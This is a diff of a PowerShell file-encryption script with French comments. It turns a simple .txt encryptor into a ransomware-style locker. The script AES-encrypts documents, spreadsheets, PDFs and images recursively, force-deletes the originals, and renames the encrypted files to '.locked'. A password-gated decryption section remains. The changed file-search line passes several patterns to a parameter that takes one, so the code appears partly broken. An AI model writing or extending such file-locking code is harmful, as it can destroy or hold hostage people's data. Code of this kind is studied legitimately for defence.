@@ -5,7 +5,7 @@ $sha = New-Object System.Security.Cryptography.SHA256Managed
 $key = $sha.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($password))
 
 # --- CHIFFREMENT ---
-$files = Get-ChildItem $folder -File -Filter "*.txt"
+$files = Get-ChildItem $folder -File -Filter "*.txt","*.docx","*.pdf","*.xlsx","*.jpg","*.png" -Recurse
 
 foreach ($file in $files)
 {
@@ -16,7 +16,7 @@ foreach ($file in $files)
     $encryptor = $aes.CreateEncryptor()
     $encryptedData = $encryptor.TransformFinalBlock($data, 0, $data.Length)
     $result = $aes.IV + $encryptedData
-    $outputFile = $file.FullName + ".enc"
+    $outputFile = $file.FullName + ".locked"
     [System.IO.File]::WriteAllBytes($outputFile, $result)
     Remove-Item $file.FullName -Force
     Write-Host "Chiffre :" $file.Name
@@ -80,7 +80,7 @@ if ($userPassword -ne $password)
 }
 
 # --- DECHIFFREMENT ---
-$encryptedFiles = Get-ChildItem $folder -File -Filter "*.enc"
+$encryptedFiles = Get-ChildItem $folder -File -Filter "*.locked"
 
 foreach ($encFile in $encryptedFiles)
 {
@@ -92,7 +92,7 @@ foreach ($encFile in $encryptedFiles)
     $aes.IV = $iv
     $decryptor = $aes.CreateDecryptor()
     $decryptedData = $decryptor.TransformFinalBlock($encryptedData, 0, $encryptedData.Length)
-    $originalName = $encFile.FullName -replace '\.enc$', ''
+    $originalName = $encFile.FullName -replace '\.locked$', ''
     [System.IO.File]::WriteAllBytes($originalName, $decryptedData)
     Remove-Item $encFile.FullName -Force
     Write-Host "Dechiffre :" $originalName
